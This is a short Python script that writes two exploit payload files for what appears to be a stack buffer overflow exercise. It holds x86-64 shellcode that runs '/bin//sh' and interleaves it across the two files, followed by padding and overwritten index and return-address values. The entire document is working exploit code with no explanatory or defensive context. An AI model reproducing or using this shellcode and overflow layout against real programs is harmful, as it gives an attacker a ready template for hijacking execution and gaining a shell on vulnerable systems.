import sys
import subprocess

shell_code = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

with open("exploit1", "wb+") as f1:
    for i in range (0, len(shell_code), 2):
        f1.write(shell_code[i:i+1])

    f1.write(b'\xff'*(32-14)) # fill the rest of buf
    f1.write(b'\xff'*12) # up to 104
    f1.write(b'\xff'*4) # filling 104 (idx)
    f1.write(b'\x80\xff\xff\x00') # 112
    f1.write(b'\x00\xff\xff\x00') # return addr

with open("exploit2", "wb+") as f2:
    for j in range (1, len(shell_code), 2):
        f2.write(shell_code[j:j+1])

    f2.write(b'\x00'*(32-13))
    f2.write(b'\x00'*12)
    f2.write(b'\x00'*4) # idx
    f2.write(b'\xe3\xff\x7f\x00') # 112
    f2.write(b'\xe3\xff\x7f\x00') # return

